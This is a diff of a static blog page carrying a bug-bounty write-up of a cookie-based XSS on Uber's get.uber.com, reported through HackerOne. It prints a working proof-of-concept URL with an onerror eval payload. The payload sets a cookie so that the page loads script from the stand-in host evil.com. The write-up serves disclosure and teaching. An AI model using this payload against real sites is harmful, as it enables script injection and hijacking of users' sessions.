@@ -66,7 +66,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="BBP,XSS,安全," />
+  <meta name="keywords" content="安全,XSS,BBP," />
 
 
 
@@ -84,23 +84,23 @@
 
 
 
-<meta name="description" content="This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
-JSONP RequestSeveral months ago">
+<meta name="description" content="This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly. JSONP RequestSeveral months ago">
+<meta name="keywords" content="安全,XSS,BBP">
 <meta property="og:type" content="article">
 <meta property="og:title" content="[BBP系列二] Uber XSS via Cookie">
 <meta property="og:url" content="http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/index.html">
 <meta property="og:site_name" content="zhchbin">
-<meta property="og:description" content="This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
-JSONP RequestSeveral months ago">
+<meta property="og:description" content="This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly. JSONP RequestSeveral months ago">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg">
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg">
+<meta property="og:updated_time" content="2017-09-09T14:22:27.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="[BBP系列二] Uber XSS via Cookie">
-<meta name="twitter:description" content="This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly.
-JSONP RequestSeveral months ago">
-
+<meta name="twitter:description" content="This write up is about part of my latest XSS report to Uber@hackerone. Sorry for my poor English first of all, I will try my best to explain this XSS problem throughly. JSONP RequestSeveral months ago">
+<meta name="twitter:image" content="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg">
 
 
 
@@ -319,7 +319,7 @@ JSONP RequestSeveral months ago">
 <h2 id="JSONP-Request"><a href="#JSONP-Request" class="headerlink" title="JSONP Request"></a>JSONP Request</h2><p>Several months ago, when enjoying my Spring Festival Holiday at home, I decided to do something interesting, so I started hunting for a bug. I like searching in the chrome dev tools. This time my lucky word was <code>jsonp</code>, and my target domain was <code>https://get.uber.com</code>. Let’s look at what I had found at that time.</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">idrCall: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a, b;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.idrCallPending ? <span class="keyword">void</span> <span class="number">0</span> : (<span class="keyword">this</span>.log(<span class="string">"making idr call"</span>),</span><br><span class="line">    a = <span class="keyword">this</span>.rfiServer ? <span class="keyword">this</span>.rfiServer : <span class="string">"a.rfihub.com"</span>,</span><br><span class="line">    b = <span class="keyword">this</span>.getProtocol() + <span class="string">"//"</span> + a + <span class="string">"/idr.js"</span>,</span><br><span class="line">    <span class="keyword">this</span>.jsonpGet(b, &#123;&#125;, <span class="keyword">this</span>.idrCallback, <span class="string">"cmZpSWRJbkNhY2hl"</span>),</span><br><span class="line">    <span class="keyword">this</span>.idrCallPending = !<span class="number">0</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj2030d1ocj21d00r0gsw.jpg" alt=""></p>
-<p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href="https://stackoverflow.com/a/2067584" target="_blank" rel="external">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p>
+<p>Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code>this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know <a href="https://stackoverflow.com/a/2067584" target="_blank" rel="noopener">the essence of JSONP</a>. The next step was searching everything about <code>rfiServer</code>.</p>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj20krdxhbj20tm0f042c.jpg" alt=""></p>
 <p>After reading through these lines of code:</p>
 <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="keyword">this</span>.readCookie(<span class="string">"_rfiServer"</span>),</span><br><span class="line"><span class="literal">null</span> != a &amp;&amp; <span class="keyword">this</span>.setRfiServer(a),</span><br></pre></td></tr></table></figure>
@@ -330,7 +330,7 @@ JSONP RequestSeveral months ago">
 </ul>
 <p>What? We need to find a bug to trigger another bug. And why any subdomain of uber.com?</p>
 <h2 id="The-Feature-of-Cookie"><a href="#The-Feature-of-Cookie" class="headerlink" title="The Feature of Cookie"></a>The Feature of Cookie</h2><p>Any subdomain of uber.com can set cookie with domain <code>.uber.com</code> to be used across subdomains. For instance, we can set cookie in <code>xxx.uber.com</code> using following code, then <code>get.uber.com</code> will use the cookie value.</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document<span class="class">.cookie</span> = <span class="string">'_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie = &apos;_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/&apos;</span><br></pre></td></tr></table></figure>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21fxdw02j21dk16qqel.jpg" alt=""></p>
 <h2 id="XSS-of-uber-com-which-is-Out-of-Scope"><a href="#XSS-of-uber-com-which-is-Out-of-Scope" class="headerlink" title="XSS of .uber.com which is Out of Scope"></a>XSS of <redacted>.uber.com which is Out of Scope</redacted></h2><p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code>&lt;redacted&gt;.uber.com</code> for demo.</p>
 <p><img src="https://ws1.sinaimg.cn/large/7184df6bgy1fj21w61lp8j21dw0fy79z.jpg" alt=""></p>
@@ -343,7 +343,7 @@ JSONP RequestSeveral months ago">
 <li>Use reflected XSS of <code>&lt;redacted&gt;.uber.com</code> to set the value of <code>_rfiServer</code> cookie to <code>evil.com</code></li>
 <li>Visit <code>get.uber.com</code>, JSONP request to <code>https://evil.com/idr.js</code>, XSS of <code>get.uber.com</code> is done.</li>
 <li><p>The final PoC</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span><br><span class="line">email=aaa"%20type%3d"image"%20src%3d1%20o&gt;nerror%3d"eval(decodeURIComponent(location.hash.substr(1)))</span><br><span class="line">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//&lt;redacted&gt;.uber.com/&lt;redacted&gt;?</span></span><br><span class="line">email=aaa<span class="string">"%20type%3d"</span>image<span class="string">"%20src%3d1%20o&gt;nerror%3d"</span><span class="built_in">eval</span>(<span class="built_in">decodeURIComponent</span>(location.hash.substr(<span class="number">1</span>)))</span><br><span class="line">#document.cookie='_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2999 01:43:57 GMT;path=/';location.href="https://get.uber.com";</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>Thanks for Uber. Reward: 5k</p>
 </li>
@@ -370,11 +370,11 @@ JSONP RequestSeveral months ago">
       
         <div class="post-tags">
           
-            <a href="/tags/BBP/" rel="tag">#BBP</a>
+            <a href="/tags/安全/" rel="tag">#安全</a>
           
             <a href="/tags/XSS/" rel="tag">#XSS</a>
           
-            <a href="/tags/安全/" rel="tag">#安全</a>
+            <a href="/tags/BBP/" rel="tag">#BBP</a>
           
         </div>
       
@@ -569,7 +569,7 @@ JSONP RequestSeveral months ago">
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JSONP-Request"><span class="nav-number">1.</span> <span class="nav-text">JSONP Request</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Feature-of-Cookie"><span class="nav-number">2.</span> <span class="nav-text">The Feature of Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-of-uber-com-which-is-Out-of-Scope"><span class="nav-number">3.</span> <span class="nav-text">XSS of .uber.com which is Out of Scope</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">4.</span> <span class="nav-text">Summary</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#JSONP-Request"><span class="nav-number">1.</span> <span class="nav-text"><a href="#JSONP-Request" class="headerlink" title="JSONP Request"></a>JSONP Request</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#The-Feature-of-Cookie"><span class="nav-number">2.</span> <span class="nav-text"><a href="#The-Feature-of-Cookie" class="headerlink" title="The Feature of Cookie"></a>The Feature of Cookie</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS-of-uber-com-which-is-Out-of-Scope"><span class="nav-number">3.</span> <span class="nav-text"><a href="#XSS-of-uber-com-which-is-Out-of-Scope" class="headerlink" title="XSS of .uber.com which is Out of Scope"></a>XSS of <redacted>.uber.com which is Out of Scope</redacted></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Summary"><span class="nav-number">4.</span> <span class="nav-text"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</span></a></li></ol></div>
             
           </div>
         </section>
@@ -588,7 +588,7 @@ JSONP RequestSeveral months ago">
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
